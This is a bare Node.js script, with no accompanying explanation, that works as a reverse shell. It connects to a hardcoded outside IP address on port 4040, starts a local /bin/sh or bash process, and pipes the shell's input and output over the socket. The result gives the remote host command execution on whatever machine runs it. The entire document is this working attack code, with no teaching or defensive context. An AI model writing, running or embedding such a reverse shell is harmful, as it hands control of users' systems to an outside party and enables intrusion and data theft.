const { exec } = require('child_process');
const net = require('net');

const targetIP = '154.61.80.228';
const targetPort = 4040;

const client = new net.Socket();

client.connect(targetPort, targetIP, () => {
    console.log('Connected to the target IP and port');

    // Try different shell paths
    const shells = ['/bin/sh', '/bin/bash', '/usr/bin/sh', '/usr/bin/bash'];
    let sh;

    for (const shell of shells) {
        sh = exec(shell, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            console.error(`stderr: ${stderr}`);
        });

        if (sh) {
            break;
        }
    }

    if (sh) {
        client.write('Connected to the target IP and port\n');

        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        client.pipe(sh.stdin);
    } else {
        console.error('No valid shell found');
    }
});
